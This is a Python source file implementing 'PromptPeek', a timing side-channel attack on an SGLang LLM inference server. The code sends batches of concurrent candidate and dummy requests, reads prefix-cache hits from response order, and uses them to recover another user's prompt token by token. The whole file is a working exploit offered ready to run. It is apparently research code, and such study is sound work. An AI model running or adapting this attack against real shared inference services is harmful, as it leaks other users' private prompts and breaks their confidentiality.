import asyncio
import json
from typing import List, Tuple, Dict
from urllib.parse import quote, unquote

import httpx
import requests

# Import candidate generation functions
from promptpeek.candidate.base import get_top_k_candidates, get_bottom_k_dummies

# Configuration
SERVER_URL = "http://192.168.1.8:30000"
CANDIDATES_SIZE = 256
DUMMIES_SIZE = 16
MAX_TOKENS = 128
TEMPERATURE = 0
MAX_RECOVERED_TOKENS = 20  # Maximum number of tokens to recover
DEFAULT_MAX_TOKENS = 1

HTTPX_MAX_CONNECTIONS = int((DUMMIES_SIZE * 2 + CANDIDATES_SIZE) * 1.5)

client = httpx.AsyncClient(
    timeout=600, limits=httpx.Limits(max_connections=HTTPX_MAX_CONNECTIONS)
)


def gen_next_tokens(prefix: str) -> Tuple[List[str], List[str]]:
    """Generate candidate and dummy tokens using local model"""
    candidates = get_top_k_candidates(prefix, k=CANDIDATES_SIZE)
    dummies = get_bottom_k_dummies(prefix, k=DUMMIES_SIZE)

    return (candidates, dummies)


async def peek_one(prefix: str) -> Tuple[str, List[dict]]:
    """
    Perform timing attack to recover one token.
    Returns (recovered_token, response_order)
    """
    print(f"[*] Generating candidates for prefix: '{prefix[:50]}...'")
    cand_toks, dummy_toks = gen_next_tokens(prefix)

    tasks = []

    # Send pre-dummies first to establish baseline
    for i in range(DUMMIES_SIZE):
        text = prefix + dummy_toks[i] * 2
        metadata = {
            "id": f"pre_dummy_{i}",
            "prompt": text,
            "token": dummy_toks[i],
            "type": "pre_dummy",
        }
        tasks.append(asyncio.create_task(_send_request(client, text, metadata)))

    for i, token in enumerate(cand_toks):
        text = prefix + token * 2
        metadata = {
            "id": f"candidate_{i}",
            "prompt": text,
            "token": token,
            "type": "candidate",
        }
        tasks.append(asyncio.create_task(_send_request(client, text, metadata)))

    # Send post-dummies
    for i in range(DUMMIES_SIZE):
        text = prefix + dummy_toks[i] * 2
        metadata = {
            "id": f"post_dummy_{i}",
            "prompt": text,
            "token": dummy_toks[i],
            "type": "post_dummy",
        }
        tasks.append(asyncio.create_task(_send_request(client, text, metadata)))

    # Collect responses in order of completion
    response_order = []
    for task in asyncio.as_completed(tasks):
        response_body, metadata = await task

        e2e_latency = response_body["meta_info"]["e2e_latency"]
        req_id = metadata["id"]
        prompt = metadata["prompt"]
        token = metadata["token"]

        response_order.append(
            {"id": req_id, "prompt": prompt, "token": token, "e2e_latency": e2e_latency}
        )

    # Find first arriving candidate
    first_candidate = None
    first_candidate_idx = None

    for i, res in enumerate(response_order):
        if "candidate" in res["id"]:
            first_candidate = res
            first_candidate_idx = int(res["id"].replace("candidate_", ""))
            break

    if first_candidate:
        recovered_token = first_candidate["token"]
        return recovered_token, response_order
    else:
        return None, response_order


async def promptpeek_attack(known_prefix: str, max_tokens: int = MAX_RECOVERED_TOKENS):
    """
    Main PromptPeek attack loop - recovers tokens one by one
    """
    print("=" * 80)
    print("PromptPeek Attack Started")
    print("=" * 80)
    print(f"[*] Known prefix: '{known_prefix}'")
    print(f"[*] Max tokens to recover: {max_tokens}")
    print()

    recovered = ""

    for iteration in range(max_tokens):
        print(f"\n{'='*80}")
        print(f"Iteration {iteration + 1}/{max_tokens}")
        print(f"{'='*80}")

        current_prefix = known_prefix + recovered
        print(f"[*] Current prefix: '{current_prefix}'")

        # Perform timing attack for one token
        recovered_token, response_order = await peek_one(current_prefix)

        if recovered_token is None:
            print("[!] No candidate found - stopping attack")
            break

        # Display response order analysis
        print(f"\n[+] Response order analysis:")
        print(f"    Total responses: {len(response_order)}")

        # Find candidate positions
        candidate_positions = [
            (i, res)
            for i, res in enumerate(response_order, 1)
            if "candidate" in res["id"]
        ]

        if candidate_positions:
            print(
                f"    First candidate position: {candidate_positions[0][0]}/{len(response_order)}"
            )
            print(f"    Total candidates: {len(candidate_positions)}")

            # Show top 5 earliest candidates
            print(f"\n    Top 5 earliest candidates (likely cache hits):")
            for pos, (rank, res) in enumerate(candidate_positions[:5], 1):
                cand_id = res["id"]
                cand_num = cand_id.replace("candidate_", "")
                latency = res["e2e_latency"]
                token = res["token"]

                print(
                    f"      {pos}. Rank {rank:3d}: candidate_{cand_num:3s} "
                    f"(latency: {latency:.3f}s) - token: {repr(token)}"
                )

        # Update recovered text
        recovered += recovered_token

        print(f"\n[+] Recovered token: {repr(recovered_token)}")
        print(f"[+] Total recovered so far: '{known_prefix + recovered}'")

        # Check stopping conditions
        if recovered_token in [".", "!", "?", "\n"]:
            print("\n[*] Sentence-ending token detected - stopping attack")
            break

    print(f"\n{'='*80}")
    print("Attack Complete")
    print(f"{'='*80}")
    print(f"Known prefix:    '{known_prefix}'")
    print(f"Recovered text:  '{recovered}'")
    print(f"Full recovered:  '{known_prefix + recovered}'")
    print(f"{'='*80}\n")

    return known_prefix + recovered


async def _send_sglang_request(
    client: httpx.AsyncClient,
    prompt: str,
    server_url: str = SERVER_URL,
    max_tokens: int = 1,
    temperature: float = 0,
) -> Dict:
    """Send a single completion request"""
    payload = {
        "text": prompt,
        "sampling_params": {
            "max_new_tokens": max_tokens,
            "temperature": temperature,
        },
    }
    response = await client.post(f"{server_url}/generate", json=payload)
    response.raise_for_status()  # HTTP Error Check
    return response.json()


async def _send_request(
    client: httpx.AsyncClient,
    prompt: str,
    metadata: Dict,
    max_tokens: int = DEFAULT_MAX_TOKENS,
) -> Tuple[Dict, Dict]:
    response = await _send_sglang_request(client, prompt, max_tokens=max_tokens)
    return response, metadata


def main():
    # Attack configuration
    known_prefix = "Imagine you are a"  # Known prefix from victim's prompt

    # Run PromptPeek attack
    recovered_prompt = asyncio.run(promptpeek_attack(known_prefix))

    print(f"\n[+] Final result: '{recovered_prompt}'")